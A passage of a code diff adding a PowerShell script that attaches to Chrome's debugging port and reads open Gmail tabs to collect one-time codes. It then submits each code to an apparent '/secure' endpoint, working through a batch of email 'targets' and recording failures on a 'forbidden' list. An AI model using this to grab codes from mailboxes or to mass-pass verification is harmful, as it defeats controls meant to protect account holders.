+    param([string]$SentTo, [object[]]$Tabs)
+    if (-not $SentTo) { return $null }
+    $target = $SentTo.Trim().ToLower()
+    foreach ($t in $Tabs) {
+        if ($t.Chip -and $t.Chip.ToLower() -eq $target) { return $t }
+    }
+    foreach ($t in $Tabs) {
         try {
-            $s = Secure-Start -email $email
-            if(-not $s.ok){ continue }
-
-            $otpRes = Emails-FindOtp -email $s.sentTo -waitSec $OTP_WAIT_S
-            if(-not $otpRes.ok){ continue }
-
-            $sub = Secure-SubmitOtp -submitPath $s.submitUrl -otp $otpRes.otp
-            if(-not $sub.ok){ continue }
-
-            Start-Sleep -Milliseconds 1500
-            $ts = Secure-TaskState -taskPath $s.statusUrl
-        } catch {
-            continue
-        }
+            $text = Read-PageText -WsUrl $t.WsUrl
+            if ($text -and $text.ToLower().Contains($target)) { return $t }
+        } catch { }
     }
+    return $null
 }
 
-} catch {}
+# ============================================================================
+# one task
+# ============================================================================
+function Invoke-OneTask {
+    param([string]$Target, [object[]]$Tabs)
+    $tag = $Target -replace '[^a-zA-Z0-9]','_'
+
+    $r = Invoke-Gb -Url "$Base/secure" -Method Post -Body @{ method='otp'; email=$Target } -Tag "secure_$tag"
+    if ($r.status -eq 401) { return @{ ok=$false; reason='auth'; fatal=$true } }
+    if (-not $r.ok -or -not $r.body.success) {
+        $err = if ($r.body.error) { $r.body.error } else { $r.error }
+        return @{ ok=$false; reason="secure: $err" }
+    }
+    $d = $r.body.data
+    $submitUrl = Resolve-Url (Get-Field $d @('submitUrl'))
+    $statusUrl = Resolve-Url (Get-Field $d @('statusUrl'))
+    if (-not $submitUrl) { return @{ ok=$false; reason="no submitUrl — fields: $(Get-AllFields $d)" } }
+
+    if ($VerbosePreference -ne 'SilentlyContinue') {
+        Write-Verbose ("    task:      {0}" -f $Target)
+        Write-Verbose ("    taskId:    {0}" -f (Get-Field $d @('taskId','id')))
+        Write-Verbose ("    statusUrl: {0}" -f $statusUrl)
+        Write-Verbose ("    submitUrl: {0}" -f $submitUrl)
+    }
+
+    $sentTo = $null
+    if ($d.accounts -and @($d.accounts).Count -gt 0) { $sentTo = $d.accounts[0].sentTo }
+    Write-Host "    sentTo: $sentTo"
+
+    $tab = Find-TabForInbox -SentTo $sentTo -Tabs $Tabs
+    if (-not $tab) { return @{ ok=$false; reason="no open gmail tab for $sentTo" } }
+    Write-Host "    routed to tab: chip=$($tab.Chip)"
+
+    if ($statusUrl) {
+        $deadline0 = (Get-Date).AddSeconds($AwaitOtpSecs)
+        while ((Get-Date) -lt $deadline0) {
+            $t = Invoke-Gb -Url $statusUrl -Tag "status_$tag"
+            if ($t.ok -and $t.body.success) {
+                $st = Get-Field $t.body.data @('status','state')
+                if ($st -in @('awaiting_otp','completed','failed')) { break }
+            }
+            Start-Sleep -Seconds $Interval
+        }
+    }
+
+    Write-Host "    waiting up to ${MailArriveSecs}s for code mail in $($tab.Chip)..."
+    $deadline = (Get-Date).AddSeconds($MailArriveSecs)
+    $lastRefresh = [datetime]::MinValue
+    $otp = $null
+    while ((Get-Date) -lt $deadline) {
+        try {
+            $text = Read-PageText -WsUrl $tab.WsUrl
+            $otp  = Extract-Otp $text
+            if ($otp) { break }
+        } catch { }
+        if (((Get-Date) - $lastRefresh).TotalSeconds -ge 20) {
+            Refresh-Tab -Tab $tab
+            $lastRefresh = Get-Date
+        }
+        Start-Sleep -Seconds $Interval
+    }
+    if (-not $otp) { return @{ ok=$false; reason="no otp arrived in $($tab.Chip) for $sentTo" } }
+    Write-Host "    otp: $otp (from $($tab.Chip))"
+
+    $s = Invoke-Gb -Url $submitUrl -Method Post -Body @{ otp=$otp } -Tag "submit_$tag"
+    if ($s.status -eq 401) { return @{ ok=$false; reason='auth'; fatal=$true } }
+    if (-not ($s.ok -and $s.body.success)) {
+        $err = if ($s.body.error) { $s.body.error } else { $s.error }
+        return @{ ok=$false; reason="submit: $err" }
+    }
+
+    if ($statusUrl) {
+        $deadline2 = (Get-Date).AddSeconds(120)
+        while ((Get-Date) -lt $deadline2) {
+            $t = Invoke-Gb -Url $statusUrl -Tag "task_$tag"
+            if ($t.ok -and $t.body.success) {
+                $st = Get-Field $t.body.data @('status','state')
+                if ($st -eq 'completed') { return @{ ok=$true; reason="completed via $($tab.Chip)" } }
+                if ($st -eq 'failed')    { return @{ ok=$false; reason='task failed after submit' } }
+            }
+            Start-Sleep -Seconds $Interval
+        }
+        return @{ ok=$true; reason='otp accepted (confirm timed out)' }
+    }
+    return @{ ok=$true; reason='otp accepted' }
+}
+
+# ============================================================================
+# main
+# ============================================================================
+Write-Host "[*] attaching to chrome on port $DebugPort"
+[void](Assert-ChromeAttached)
+
+$tabs = Get-GmailTabs
+if (-not $tabs -or $tabs.Count -eq 0) {
+    throw "no gmail tabs open. open mail.google.com in at least one tab and rerun."
+}
+Write-Host "[*] open gmail tabs: $($tabs.Count)"
+foreach ($t in $tabs) {
+    $chipTxt = if ($t.Chip) { $t.Chip } else { '(chip unread)' }
+    Write-Host "    - $chipTxt"
+}
+
+if ($EmailFile) {
+    if (-not (Test-Path $EmailFile)) { throw "no such file: $EmailFile" }
+    $emails = Get-Content $EmailFile |
+        Where-Object { $_.Trim() } |
+        ForEach-Object { $_.Trim().TrimStart([char]0xFEFF) } |
+        Where-Object { $_ }
+} else {
+    $emails = $tabs | ForEach-Object { $_.Chip } | Where-Object { $_ } | Select-Object -Unique
+    Write-Host "[*] no EmailFile — using every gmail found in open tabs"
+}
+if (-not $emails) { throw 'no targets to run' }
+
+if ($OpenMissingGmailTabs) {
+    foreach ($e in $emails) {
+        $have = $tabs | Where-Object { $_.Chip -and $_.Chip.ToLower() -eq $e.ToLower() }
+        if (-not $have) {
+            Write-Host "[*] opening tab for $e"
+            [void](Open-GmailTab -Address $e)
+        }
+    }
+    $tabs = Get-GmailTabs
+}
+
+$queue = $emails | Where-Object { -not $Forbidden.Contains($_.ToLower()) }
+Write-Host "[*] queue — $($queue.Count)/$($emails.Count) targets (skipping forbidden)"
+Write-Host ""
+
+$okCount = 0; $forbidCount = 0; $authFail = $false
+
+foreach ($addr in $queue) {
+    Write-Host "[>] $addr"
+    $res = try { Invoke-OneTask -Target $addr -Tabs $tabs }
+           catch { @{ ok=$false; reason="exception: $($_.Exception.Message)" } }
+
+    if ($res.ok)          { $okCount++; Write-Host "[+] $addr — $($res.reason)" }
+    elseif ($res.fatal)   { Write-Host '[!] auth failed — stopping'; $authFail = $true; break }
+    else                  { Add-Forbidden -Addr $addr -Why $res.reason; $forbidCount++ }
+
+    if (-not $authFail) { Start-Sleep -Seconds $BetweenEmails }
+}
+
+Write-Host ""
+Write-Host "[*] batch done — ok:$okCount forbidden:$forbidCount"
